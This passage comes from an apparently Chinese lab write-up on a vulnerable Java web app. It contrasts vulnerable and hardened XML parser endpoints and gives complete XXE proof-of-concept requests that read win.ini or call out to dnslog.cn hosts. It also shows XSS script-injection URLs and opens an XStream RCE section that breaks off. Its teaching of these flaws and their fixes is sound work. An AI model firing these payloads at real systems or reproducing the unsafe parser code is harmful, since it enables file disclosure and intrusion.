class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXBuilder</span>();<br>        <span class="hljs-comment">//禁止 DOCTYPE 声明。</span><br>        builder.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//禁止解析 外部通用实体 &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br>        builder.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">//禁止解析 外部参数实体</span><br>        builder.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">// org.jdom2.Document document</span><br>        builder.build(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));<br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXBuilder xxe security code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-SAXReader-vuln"><a href="#5-SAXReader-vuln" class="headerlink" title="5.&#x2F;SAXReader&#x2F;vuln"></a>5.&#x2F;SAXReader&#x2F;vuln</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXReader/vuln&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXReaderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXReader</span>();<br>        <span class="hljs-comment">// org.dom4j.Document document</span><br>        reader.read(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body))); <span class="hljs-comment">// cause xxe</span><br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXReader xxe vuln code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/SAXReader/vuln</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>150<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://f89q97.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944246.png" alt="20250727123019413"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080945207.png" alt="20250727123025939"></p><h3 id="6-SAXReader-sec"><a href="#6-SAXReader-sec" class="headerlink" title="6.&#x2F;SAXReader&#x2F;sec"></a>6.&#x2F;SAXReader&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXReader/sec&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXReaderSec</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXReader</span>();<br>        reader.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>        reader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        reader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">// org.dom4j.Document document</span><br>        reader.read(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXReader xxe security code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="7-SAXParser-vuln"><a href="#7-SAXParser-vuln" class="headerlink" title="7.&#x2F;SAXParser&#x2F;vuln"></a>7.&#x2F;SAXParser&#x2F;vuln</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXParser/vuln&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXParserVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXParserFactory</span> <span class="hljs-variable">spf</span> <span class="hljs-operator">=</span> SAXParserFactory.newInstance();<br>        <span class="hljs-type">SAXParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> spf.newSAXParser();<br>        parser.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)), <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultHandler</span>());  <span class="hljs-comment">// parse xml</span><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXParser xxe vuln code&quot;</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/SAXParser/vuln</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>152<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://h1bdeh.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080945564.png" alt="20250727123517394"></p><h3 id="8-SAXParser-sec"><a href="#8-SAXParser-sec" class="headerlink" title="8.&#x2F;SAXParser&#x2F;sec"></a>8.&#x2F;SAXParser&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXParser/sec&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXParserSec</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXParserFactory</span> <span class="hljs-variable">spf</span> <span class="hljs-operator">=</span> SAXParserFactory.newInstance();<br>        spf.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>        spf.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        spf.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-type">SAXParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> spf.newSAXParser();<br>        parser.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)), <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultHandler</span>());  <span class="hljs-comment">// parse xml</span><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXParser xxe security code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="9-这些方法的利用和修复都是一样的。"><a href="#9-这些方法的利用和修复都是一样的。" class="headerlink" title="9.这些方法的利用和修复都是一样的。"></a>9.这些方法的利用和修复都是一样的。</h3><p>POC构造：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /xxe/***/*** HTTP/1.1<br>Host: 127.0.0.1:8081<br>Content-Type: application/xml<br>Content-Length: 198  可以不写<br>Connection: close<br>        此处空一行 分隔 Header 与 Body <br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [  </span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span>  </span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br>或<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://1izyf3.dnslog.cn&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>修复：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">xmlReader.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>xmlReader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>xmlReader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/reflect&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">reflect</span><span class="hljs-params">(String xss)</span> &#123;<br>    <span class="hljs-keyword">return</span> xss;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://127.0.0.1:8081/xss/reflect?xss=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080946271.png" alt="20250727110941871"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//先将 xss 储存在 cookie 中，</span><br><span class="hljs-meta">@RequestMapping(&quot;/stored/store&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">store</span><span class="hljs-params">(String xss, HttpServletResponse response)</span> &#123;<br>    <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;xss&quot;</span>, xss);<br>    response.addCookie(cookie);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Set param into cookie&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">//访问 /stored/show 看到xss</span><br> <span class="hljs-meta">@RequestMapping(&quot;/stored/show&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">show</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue(&quot;xss&quot;)</span> String xss)</span> &#123;<br>        <span class="hljs-keyword">return</span> xss;<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/xss/</span>stored<span class="hljs-regexp">/store?xss=&lt;script&gt;alert(1)&lt;/</span>script&gt;<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/xss/</span>stored/show<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080946560.png" alt="20250727111445251"></p><p><img src="https://gitee.com/xvshifu/pic-go/raw/master/img/20250727111506996.png" alt="image-20250727111506881"></p><h2 id="XStreamRce"><a href="#XStreamRce" class="headerlink" title="XStreamRce"></a>XStreamRce</h2><blockquote><p>XStream是Java类库，用来将对象序列化成XML （JSON）或反序列化为对象。</p><p><strong>也就是说，使用XStream，我们可以把Java对象转换成XML，也可以将XML转换为Java对象。</strong></p><p>有RCE漏洞受影响版本：<br>Xstream affected version: 1.4.10 or &lt;&#x3D; 1.4.6</p><p>CVE-2020-26217 | XStream远程代码执行漏洞 </p><p><a href="https://www.cnblogs.com/303donatello/p/13998245.html">https://www.cnblogs.com/303donatello/p/13998245.html</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080947532.png" alt="20250727124508575"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@PostMapping(&quot;/xstream&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">parseXml</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">xml</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>    <span class="hljs-type">XStream</span> <span class="hljs-variable">xstream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DomDriver</span>());<br>    xstream.addPermission(AnyTypePermission.ANY); <span class="hljs-comment">// This will cause all XStream versions to be affected.</span><br>    xstream.fromXML(xml);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xstream&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xstream</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: 